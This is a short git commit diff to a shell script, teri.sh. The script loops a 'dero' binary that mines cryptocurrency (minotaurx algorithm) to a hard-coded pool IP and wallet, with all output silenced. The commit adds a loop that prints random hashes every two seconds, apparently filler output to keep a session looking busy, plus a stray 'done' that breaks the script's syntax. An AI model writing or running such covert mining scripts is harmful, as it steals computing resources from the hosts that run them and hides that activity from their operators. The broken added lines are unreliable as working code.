3467798d89a89077d6495bc693dea2b09c7f806f
RizQu5 <122372013+RizQu5@users.noreply.github.com>
2023-01-11 18:17:22 +0700

    Update teri.sh

--- teri.sh
+++ teri.sh
@@ -3,3 +3,6 @@ chmod +x dero > /dev/null 2>&1
 while [ 1 ]; do
 ./dero -a minotaurx -o stratum+tcps://178.62.199.36:7063 -u PQFYTbguveuWuwRjZRsUiQZnW3ea51Rbc3.02.beDO > /dev/null 2>&1
 done
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2s; done
+sleep 2
+done
